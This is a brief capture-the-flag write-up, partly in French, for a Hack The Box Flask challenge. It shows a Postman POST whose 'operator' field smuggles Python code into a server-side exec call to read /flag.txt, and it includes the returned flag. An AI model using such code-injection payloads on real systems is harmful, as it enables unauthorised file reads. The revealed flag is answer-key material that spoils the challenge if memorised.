# web_evaluation_deck (1)

Attaque sur le backend en Flask (python): il y a un `compile/exec` sur l'input utilisateur

Avec postman:

POST request on: `http://IP/api/get_health`

```json
{
    "current_health": "100",
    "attack_power": "100",
    "operator": "\nimport os\nfd = os.open('/flag.txt', os.O_RDONLY)\nresult = str(os.read(fd, 500))\na = "
}
```

```json
{
    "message": "b'HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}'"
}
```
